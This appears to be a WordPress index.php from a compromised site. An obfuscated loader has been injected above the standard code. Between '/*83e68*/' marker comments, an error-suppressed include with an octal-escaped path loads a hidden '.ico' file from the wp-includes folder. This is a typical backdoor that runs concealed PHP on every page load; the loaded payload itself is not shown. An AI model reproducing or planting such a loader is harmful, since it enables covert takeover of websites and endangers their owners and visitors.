<?php
/*83e68*/

@include "\057v\141r\057w\167w\057c\157r\157n\141k\141l\141.\143o\155/\167p\055i\156c\154u\144e\163/\162a\156d\157m\137c\157m\160a\164/\056b\066d\144f\146f\060.\151c\157";

/*83e68*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
